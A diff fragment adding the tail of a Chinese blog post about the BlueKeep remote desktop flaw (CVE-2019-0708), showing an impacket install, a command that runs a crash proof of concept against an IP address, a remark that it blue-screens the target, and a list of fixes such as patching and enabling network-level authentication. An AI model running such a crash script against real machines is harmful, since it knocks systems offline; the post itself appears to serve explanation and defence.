+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install impacket</span><br><span class="line"></span><br><span class="line">crashpoc.py 192.168.1.1 64  #python3 crashpoc.py ip地址 系统类型</span><br></pre></td></tr></table></figure>
+
+<p>执行POC会让目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+
+
+<h2 id="漏洞修复方法"><a href="#漏洞修复方法" class="headerlink" title="漏洞修复方法"></a>漏洞修复方法</h2><p>1.<a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708补丁</a></p>
+<p>2.安装安全管家类的软件</p>
+<p>3.关闭远程桌面，开启防火墙</p>
+<p>4.在远程设置里设置使用网络级别身份验证的远程桌面的计算机链接</p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>常见漏洞</category>
+      </categories>
+      <tags>
+        <tag>高危漏洞</tag>
+        <tag>代码执行漏洞</tag>
       </tags>
   </entry>
   <entry>
